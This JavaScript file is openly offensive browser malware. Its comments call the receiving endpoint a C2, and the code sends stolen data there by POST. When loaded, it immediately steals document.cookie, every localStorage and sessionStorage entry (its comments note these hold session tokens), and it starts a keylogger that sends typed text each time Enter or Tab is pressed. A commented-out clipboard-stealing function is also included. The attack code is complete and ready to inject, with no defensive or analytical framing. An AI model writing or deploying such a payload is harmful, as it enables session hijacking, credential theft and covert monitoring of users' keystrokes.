// Send data to C2. Should take in json object.
function exfil(data) {
    fetch("http://localhost:8080/", {
    //fetch("https://localhost:8080/", {
        method: "POST",
        mode: "no-cors",
        headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
        },
        // data should be json.
        body: data,
    })
}


// Scan any keyboard input from a service and send to C2 in a buffer when enter or tabbed.
function keyLogger() {
    var pageBuf = []
    var tmpStr = ""
    document.addEventListener('keydown', function(event) {
        if (event.code == "Tab" || event.code == "Enter") {
            pageBuf.push(tmpStr);
            // Don't send if pageBuf is empty.
            if (pageBuf.length > 1 || tmpStr != '') {
                exfil(JSON.stringify({"keystrokes": pageBuf}));
                pageBuf = [];
                tmpStr = "";
            }
        } else if (event.code == "Shift" || event.code == "Alt" || event.code == "Control") {
            // Ignore characters
        } else if (event.code == "Backspace") {
            // TODO Remove previous key if any.
        } else {
            tmpStr += event.key;
        }
    });
}

// Steal cookies.
function getCookies() {
    // TODO: Fix formatting to array.
    exfil(JSON.stringify({"Cookies": document.cookie}));
}

// Get all local storage entries and exfil them
// Local storage can store session tokens.
function getLocalStorage() {
    if (localStorage.length == 0) {
        return;
    }
    var storedItems = []
    for (var i = 0; i < localStorage.length; ++i) {
        storedItems.push(localStorage.getItem(localStorage.key(i)));
    }
    exfil(JSON.stringify({"Local_storage": storedItems}))
}

// Get all session storage objects and exfil them
// Session storage can be used to store session tokens.
function getSessionStorage() {
    if (sessionStorage.length == 0) {
        return;
    }
    var sessions = [];
    for (var i = 0; i < sessionStorage.length; ++i) {
        sessions.push(sessionStorage.getItem(sessionStorage.key(i)));
    }
    exfil(JSON.stringify({"Session_storage": sessions}))
}

/* The clipboard API is quite heavily restricted on modern browsers.
* Wonder why...
function stealClipboard() {
    navigator.clipboard.readText()
    .then(text => {
      console.log('Pasted content: ', text);
    })
}
*/ 

getCookies();
getLocalStorage();
getSessionStorage();
keyLogger();
